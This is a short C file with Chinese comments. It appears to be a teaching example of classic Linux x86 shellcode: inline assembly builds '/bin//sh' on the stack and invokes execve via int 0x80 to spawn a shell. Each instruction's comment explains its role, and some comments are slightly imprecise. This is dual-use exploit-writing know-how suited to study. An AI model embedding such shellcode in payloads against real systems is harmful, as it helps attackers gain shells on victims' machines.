// filename：shellcode.c
#include <stdio.h>
void shellcode(){
	__asm__(
	"xor %eax,%eax\n\t"		// 将eax寄存器异或处理值为0
	"pushl %eax\n\t"		// 将0压入栈，push相当于pushl
	"push $0x68732f2f\n\t"	// 将“//sh”压入栈，//是为了凑4个字节对齐
	"push $0x6e69622f\n\t"	// 将“/bin”压入栈
	"movl %esp,%ebx\n\t"	// 将栈底指针ebx赋值为当前栈顶指针esp
	"pushl %eax\n\t"		// 将0压入栈中
	"pushl %ebx\n\t"		// 将字符串“//sh/bin/0”的首地址压入栈中
	"movl %esp,%ecx\n\t"	// 让ecx指向ebx
	"cltd\n\t"				// 让eax拓展到edx:eax，即edx设置为0
	"movb $0xb,%al\n\t"		// 将execve的功能号赋值给eax的低八位
	"int $0x80\n\t"			// 使用软中断进行系统调用
	);
}
int main(int argc, char **argv){
	shellcode();
	return 0;
}
